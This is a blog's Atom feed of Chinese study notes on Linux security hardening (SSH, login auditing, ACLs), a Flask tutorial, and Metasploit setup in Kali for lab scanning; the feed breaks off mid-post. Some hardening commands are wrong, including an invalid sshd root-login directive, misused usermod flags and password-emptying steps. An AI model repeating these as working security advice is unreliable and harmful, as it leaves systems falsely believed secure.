<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-06-24T07:39:16.221Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>4-Linux的远程认证</title>
    <link href="http://yoursite.com/2018/06/24/4-Linux%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%AE%A4%E8%AF%81/"/>
    <id>http://yoursite.com/2018/06/24/4-Linux的远程认证/</id>
    <published>2018-06-24T07:35:37.000Z</published>
    <updated>2018-06-24T07:39:16.221Z</updated>
    
    <content type="html"><![CDATA[<h1 id="增强ssh安全性"><a class="markdownIt-Anchor" href="#增强ssh安全性"></a> 增强ssh安全性</h1><h3 id="改变ssh的端口"><a class="markdownIt-Anchor" href="#改变ssh的端口"></a> 改变ssh的端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp /ect/ssh/sshd_onfig /etc/ssh/sshd_config.backup</span><br><span class="line"></span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">...</span><br><span class="line">Port 3333</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h3 id="禁止root直接登录"><a class="markdownIt-Anchor" href="#禁止root直接登录"></a> 禁止root直接登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">...</span><br><span class="line">PermissionRootLogin no</span><br><span class="line">...</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h3 id="只允许一部分用户登录"><a class="markdownIt-Anchor" href="#只允许一部分用户登录"></a> 只允许一部分用户登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">...</span><br><span class="line">AllowUsers user1 user2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h3 id="使用密钥登录服务器"><a class="markdownIt-Anchor" href="#使用密钥登录服务器"></a> 使用密钥登录服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 首先在本地生成一个私钥和公钥。客户端</span><br><span class="line">ssh-keygen-t rsa</span><br><span class="line"></span><br><span class="line">2. 将客户端的公钥上传到服务器端</span><br><span class="line">ssh-copy-id -p 33 linux@172.16.190.901</span><br><span class="line"></span><br><span class="line">3. 登录</span><br><span class="line">ssh -p 33 linux@172.111.111.111</span><br></pre></td></tr></table></figure><h3 id="禁止密码登录"><a class="markdownIt-Anchor" href="#禁止密码登录"></a> 禁止密码登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">...</span><br><span class="line">PasswordAuthentication      no</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;增强ssh安全性&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#增强ssh安全性&quot;&gt;&lt;/a&gt; 增强ssh安全性&lt;/h1&gt;
&lt;h3 id=&quot;改变ssh的端口&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#改变s
      
    
    </summary>
    
      <category term="Linux_security" scheme="http://yoursite.com/categories/Linux-security/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>3-Linux的本地认证</title>
    <link href="http://yoursite.com/2018/06/24/3-Linux%E7%9A%84%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81/"/>
    <id>http://yoursite.com/2018/06/24/3-Linux的本地认证/</id>
    <published>2018-06-24T07:35:11.000Z</published>
    <updated>2018-06-24T07:36:23.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><ul><li>[x] 用户认证和日志记录</li><li>[x] 限制用户登录的能力</li><li>[x] 使用acct监视用户行为</li><li>[x] 定义用户授权控制</li><li>[ ] 使用USB设备和PAM进行登录</li></ul><h1 id="日志记录"><a class="markdownIt-Anchor" href="#日志记录"></a> 日志记录</h1><h3 id="varlog"><a class="markdownIt-Anchor" href="#varlog"></a> /var/log</h3><blockquote><p>存放着各种log</p></blockquote><h3 id="查看特定账号的错误登录尝试"><a class="markdownIt-Anchor" href="#查看特定账号的错误登录尝试"></a> 查看特定账号的错误登录尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastb root</span><br></pre></td></tr></table></figure><h3 id="查看内存中缓存的内核信息"><a class="markdownIt-Anchor" href="#查看内存中缓存的内核信息"></a> 查看内存中缓存的内核信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg</span><br></pre></td></tr></table></figure><h3 id="查看最近某用户登录信息"><a class="markdownIt-Anchor" href="#查看最近某用户登录信息"></a> 查看最近某用户登录信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure><h3 id="查看最后一次登录"><a class="markdownIt-Anchor" href="#查看最后一次登录"></a> 查看最后一次登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastlog</span><br></pre></td></tr></table></figure><h1 id="限制用户登录"><a class="markdownIt-Anchor" href="#限制用户登录"></a> 限制用户登录</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">usermod -s /usr/bim/nologin user1</span><br><span class="line">passwd -l user1</span><br><span class="line">usermod -l user1</span><br><span class="line"># 解锁</span><br><span class="line">passwd -u user1</span><br><span class="line">usermod -u user1</span><br></pre></td></tr></table></figure><h1 id="使用acct监视用户"><a class="markdownIt-Anchor" href="#使用acct监视用户"></a> 使用acct监视用户</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install acct</span><br><span class="line"></span><br><span class="line">查询特定用户执行过的命令</span><br><span class="line">lastcomm root</span><br></pre></td></tr></table></figure><h1 id="定义用户用户授权限制"><a class="markdownIt-Anchor" href="#定义用户用户授权限制"></a> 定义用户用户授权限制</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim sudoers</span><br><span class="line"># 每次切换root权限都需要输入密码</span><br><span class="line">Defaults user1 timestamp_timeout=0</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>这章，比较没写什么有价值的东西。单纯了解了一些linux的操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;[x] 用户认证和日志记录&lt;/li&gt;
&lt;li&gt;[x] 限制用户登录的能力&lt;/li&gt;
&lt;li&gt;[x] 使用acct监视用户行为&lt;/li
      
    
    </summary>
    
      <category term="Linux_security" scheme="http://yoursite.com/categories/Linux-security/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>2-本地文件系统安全</title>
    <link href="http://yoursite.com/2018/06/24/2-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/06/24/2-本地文件系统安全/</id>
    <published>2018-06-24T04:33:17.000Z</published>
    <updated>2018-06-24T04:39:13.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><ul><li>[x] 使用chmod命令改变文件权限</li><li>[x] 使用访问控制列表</li><li>[ ] 在Ubuntu上安装一个LDAP</li></ul><h1 id="chmod命令"><a class="markdownIt-Anchor" href="#chmod命令"></a> chmod命令</h1><blockquote><p>除了以下的方式外，还可以使用八进制的方式来做权限控制，暂且不表。</p></blockquote><h3 id="命令参数"><a class="markdownIt-Anchor" href="#命令参数"></a> 命令参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">u 代表文件或者目录的所有者 users</span><br><span class="line">g 代表文件或者目录所属的组 groups</span><br><span class="line">o 代表文件或者目录外的其他 others</span><br><span class="line">a 代表以上所有             all</span><br><span class="line"></span><br><span class="line">r 代表 读</span><br><span class="line">x 代表 执行</span><br><span class="line">w 代表 写</span><br></pre></td></tr></table></figure><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 新建文件</span><br><span class="line">&gt;&gt; touch test.txt</span><br><span class="line"># 赋予执行的权限</span><br><span class="line">&gt;&gt; chmod u+x test.txt</span><br><span class="line"># 赋予组成员执行权限</span><br><span class="line">&gt;&gt; chmod g+x u+x test.txt</span><br><span class="line"># 收回权限</span><br><span class="line">&gt;&gt; chmod u-x test.txt</span><br><span class="line"># 将某个文件的权限复制给另一个文件</span><br><span class="line">&gt;&gt; chmod --reference=file1 file2</span><br><span class="line"># 递归添加权限</span><br><span class="line">&gt;&gt; chmod o+x -R /example</span><br></pre></td></tr></table></figure><h1 id="使用访问控制列表"><a class="markdownIt-Anchor" href="#使用访问控制列表"></a> 使用访问控制列表</h1><h3 id="获取权限控制信息"><a class="markdownIt-Anchor" href="#获取权限控制信息"></a> 获取权限控制信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">linux@linux:~$ getfacl /usr</span><br><span class="line">getfacl: Removing leading &apos;/&apos; from absolute path names</span><br><span class="line"># file: usr</span><br><span class="line"># owner: root</span><br><span class="line"># group: root</span><br><span class="line">user::rwx</span><br><span class="line">group::r-x</span><br><span class="line">other::r-x</span><br></pre></td></tr></table></figure><h3 id="操作指南"><a class="markdownIt-Anchor" href="#操作指南"></a> 操作指南</h3><h5 id="添加用户组"><a class="markdownIt-Anchor" href="#添加用户组"></a> 添加用户+组</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">useradd user1</span><br><span class="line">useradd user2</span><br><span class="line">useradd user3</span><br><span class="line">passwd -d user1</span><br><span class="line">passwd -d user2</span><br><span class="line">passwd -d user3</span><br><span class="line"></span><br><span class="line">addgroup group1</span><br><span class="line"></span><br><span class="line">usermod -G group1 user1</span><br><span class="line">usermod -G group1 user2</span><br><span class="line">usermod -G group1 user3</span><br></pre></td></tr></table></figure><h5 id="user1-想把文件夹user1-分享给user2但是不给user3"><a class="markdownIt-Anchor" href="#user1-想把文件夹user1-分享给user2但是不给user3"></a> user1 想把文件夹user1 分享给user2，但是不给user3</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir accounts</span><br><span class="line">chown user1 accounts</span><br><span class="line"></span><br><span class="line">su user1</span><br><span class="line">setfacl -m u:user1:rxw accounts</span><br><span class="line">setfacl -m u:user2:rwx accounts</span><br><span class="line">setfacl -m other:--- accounts</span><br></pre></td></tr></table></figure><h5 id="实验验证"><a class="markdownIt-Anchor" href="#实验验证"></a> 实验验证</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@linux:~# su user3</span><br><span class="line">$ cd /example</span><br><span class="line">$ ls</span><br><span class="line">accounts</span><br><span class="line">$ cd accounts</span><br><span class="line">sh: 3: cd: can&apos;t cd to accounts</span><br></pre></td></tr></table></figure><h5 id="对权限控制做备份"><a class="markdownIt-Anchor" href="#对权限控制做备份"></a> 对权限控制做备份</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ getfacl -R accounts &gt; accounts/permissions.acl                   </span><br><span class="line">$ cd accounts</span><br><span class="line">$ ls</span><br><span class="line">permissions.acl</span><br></pre></td></tr></table></figure><h5 id="恢复备份"><a class="markdownIt-Anchor" href="#恢复备份"></a> 恢复备份</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setfacl -- restore=permission.acl</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>LADP暂时用不到，先不弄了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;[x] 使用chmod命令改变文件权限&lt;/li&gt;
&lt;li&gt;[x] 使用访问控制列表&lt;/li&gt;
&lt;li&gt;[ ] 在Ubuntu上安装一
      
    
    </summary>
    
      <category term="Linux_security" scheme="http://yoursite.com/categories/Linux-security/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>1-Linux中的安全问题</title>
    <link href="http://yoursite.com/2018/06/24/1-Linux%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/06/24/1-Linux中的安全问题/</id>
    <published>2018-06-24T02:04:07.000Z</published>
    <updated>2018-06-24T04:39:00.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>读书笔记</p></blockquote><h1 id="linux的安全策略"><a class="markdownIt-Anchor" href="#linux的安全策略"></a> Linux的安全策略</h1><ol><li>对系统的访问能力</li><li>系统上安装软件的权限</li><li>数据的访问能力</li><li>故障恢复</li></ol><h1 id="检验安装介质的安全性"><a class="markdownIt-Anchor" href="#检验安装介质的安全性"></a> 检验安装介质的安全性</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">md5sum ubuntu18.iso</span><br><span class="line"></span><br><span class="line"># windows </span><br><span class="line">CertUtil -hashfile xxxx.iso MD5</span><br><span class="line"></span><br><span class="line"># mac</span><br><span class="line">~/Downloads» md5 ubuntu18.iso </span><br><span class="line">MD5 (ubuntu18.iso) = 129292a182136a35e1f89c586dbac2e2</span><br><span class="line"></span><br><span class="line">---------------------------------</span><br><span class="line">官网md5：</span><br><span class="line"></span><br><span class="line">129292a182136a35e1f89c586dbac2e2 *ubuntu-18.04-desktop-amd64.iso</span><br></pre></td></tr></table></figure><h1 id="配置sudo访问"><a class="markdownIt-Anchor" href="#配置sudo访问"></a> 配置sudo访问</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">useradd test</span><br><span class="line">groupadd testgroups</span><br><span class="line">passwd test</span><br><span class="line">visudo </span><br><span class="line"></span><br><span class="line">## Allow people in group test run all commands</span><br><span class="line">test ALL=(ALL) ALL</span><br><span class="line"></span><br><span class="line">usermod -aG testgroups test</span><br><span class="line"></span><br><span class="line">sudo test -</span><br></pre></td></tr></table></figure><h1 id="使用namp扫描metasploitable2"><a class="markdownIt-Anchor" href="#使用namp扫描metasploitable2"></a> 使用namp扫描metasploitable2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 首先下载metasploitable2</span><br><span class="line">https://sourceforge.net/projects/metasploitable/ </span><br><span class="line"># 安装kali系统</span><br><span class="line"># 设置kali系统的metasploitable</span><br><span class="line"># 使用进行扫描</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;读书笔记&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;linux的安全策略&quot;&gt;&lt;a class=&quot;markdo
      
    
    </summary>
    
      <category term="Linux_security" scheme="http://yoursite.com/categories/Linux-security/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Flask09-补缺补漏</title>
    <link href="http://yoursite.com/2018/06/24/Flask09-%E8%A1%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F/"/>
    <id>http://yoursite.com/2018/06/24/Flask09-补缺补漏/</id>
    <published>2018-06-24T01:56:42.000Z</published>
    <updated>2018-06-24T01:57:21.183Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>补缺补漏</p></blockquote><h1 id="写文章的表单"><a class="markdownIt-Anchor" href="#写文章的表单"></a> 写文章的表单</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class PostForm(FlaskForm):</span><br><span class="line">    body = TextAreaField(&apos;Say something:&apos;,validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(&apos;Submit&apos;)</span><br></pre></td></tr></table></figure><h1 id="体现到首页"><a class="markdownIt-Anchor" href="#体现到首页"></a> 体现到首页</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># index.html</span><br><span class="line">&#123;% extends &quot;basic.html&quot; %&#125;</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">    &lt;div class=&apos;main&apos;&gt;</span><br><span class="line">        &#123;% if current_user.is_active %&#125;</span><br><span class="line">        &lt;h1&gt;Hello, &#123;&#123; current_user.username &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;!--这里如果没有form，那么就不展示这个表单--&gt;</span><br><span class="line">        &#123;% if form %&#125;</span><br><span class="line">        &lt;form action=&apos;&apos; method=&apos;POST&apos;&gt;</span><br><span class="line">            &#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &#123;&#123; form.body.label &#125;&#125;</span><br><span class="line">                &#123;&#123; form.body(class_=&apos;body&apos;)&#125;&#125;</span><br><span class="line">                &#123;% for error in form.body.errors %&#125;</span><br><span class="line">                &lt;span style=&apos;color:red;&apos;&gt;&#123;&#123; error &#125;&#125;&lt;/span&gt;</span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &#123;&#123; form.submit()&#125;&#125;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;h1&gt;Hello, Stranger&lt;/h1&gt;</span><br><span class="line">        &#123;% endif%&#125;</span><br><span class="line">        &#123;% include &quot;_posts.html&quot; %&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h1 id="路由逻辑编写"><a class="markdownIt-Anchor" href="#路由逻辑编写"></a> 路由逻辑编写</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;,methods=[&apos;GET&apos;,&quot;POST&quot;])</span><br><span class="line">@app.route(&apos;/index&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def index():</span><br><span class="line">    # 如果已经登录，那么首页就展示关注的人的文章</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        posts = current_user.followed_posts().all()</span><br><span class="line">        form = PostForm()</span><br><span class="line">        if form.validate_on_submit():</span><br><span class="line">            post = Post(body=form.body.data,author=current_user)</span><br><span class="line">            db.session.add(post)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            # 使用redirect可以避免导致最后一次提交的时候，重复刷新的话，为GET请求，而不是post请求</span><br><span class="line">            return redirect(url_for(&apos;index&apos;))</span><br><span class="line">        return render_template(&apos;index.html&apos;,posts=posts,form=form)</span><br><span class="line">    else:</span><br><span class="line">    # 如果没有登录，就按时间展示所有文章</span><br><span class="line">        posts = Post.query.order_by(Post.timestamp.desc()).all()</span><br><span class="line">        return render_template(&apos;index.html&apos;,posts=posts)</span><br></pre></td></tr></table></figure><h1 id="如果登录还怎么看全部的文章"><a class="markdownIt-Anchor" href="#如果登录还怎么看全部的文章"></a> 如果登录还怎么看全部的文章？</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/explore&apos;)</span><br><span class="line">@login_required</span><br><span class="line">def explore():</span><br><span class="line">    posts = Post.query.order_by(Post.timestamp.desc()).all()</span><br><span class="line">    return render_template(&apos;index.html&apos;,posts=posts)</span><br></pre></td></tr></table></figure><h1 id="如何快速的看到别人的文章就关注别人"><a class="markdownIt-Anchor" href="#如何快速的看到别人的文章就关注别人"></a> 如何快速的看到别人的文章就关注别人？</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># _post.html</span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;a href=&quot;&#123;&#123; url_for(&apos;user&apos;,username=post.author.username)&#125;&#125;&quot;&gt;&#123;&#123; post.author.username&#125;&#125;&lt;/a&gt;says: &#123;&#123; post.body &#125;&#125;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;补缺补漏&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;写文章的表单&quot;&gt;&lt;a class=&quot;markdownIt
      
    
    </summary>
    
      <category term="Flask" scheme="http://yoursite.com/categories/Flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>在kali中配置metasploit</title>
    <link href="http://yoursite.com/2018/06/24/%E5%9C%A8kali%E4%B8%AD%E9%85%8D%E7%BD%AEmetasploit/"/>
    <id>http://yoursite.com/2018/06/24/在kali中配置metasploit/</id>
    <published>2018-06-24T01:54:59.000Z</published>
    <updated>2018-06-24T04:39:46.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装kali系统"><a class="markdownIt-Anchor" href="#安装kali系统"></a> 安装Kali系统</h1><p>推荐使用虚拟机，太简单不赘述。</p><h1 id="配置数据库"><a class="markdownIt-Anchor" href="#配置数据库"></a> 配置数据库</h1><h3 id="开启开机启动"><a class="markdownIt-Anchor" href="#开启开机启动"></a> 开启开机启动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rc.local 添加</span><br><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure><h3 id="启动数据库"><a class="markdownIt-Anchor" href="#启动数据库"></a> 启动数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start </span><br><span class="line">systemctl restart postgresql</span><br></pre></td></tr></table></figure><h3 id="创建新用户"><a class="markdownIt-Anchor" href="#创建新用户"></a> 创建新用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; su postgres</span><br><span class="line">&gt;&gt; pssql</span><br><span class="line">&gt;&gt; create user &quot;msfuser&quot; with password &apos;msfpassword&apos; nocreatedb;</span><br><span class="line">&gt;&gt; create database &quot;msfdb&quot; with owner=&quot;msfuser&quot;;</span><br></pre></td></tr></table></figure><h3 id="编辑databaseyml文件"><a class="markdownIt-Anchor" href="#编辑databaseyml文件"></a> 编辑database.yml文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;cd /usr/share/metasploit-framework/config</span><br><span class="line">&gt;&gt; cp database.yml.example database.yml</span><br><span class="line">&gt;&gt; vim database.yml</span><br><span class="line">...</span><br><span class="line">database: msfdb</span><br><span class="line">username: msfuser</span><br><span class="line">password:msfpassword</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="编辑postgresql本地启动"><a class="markdownIt-Anchor" 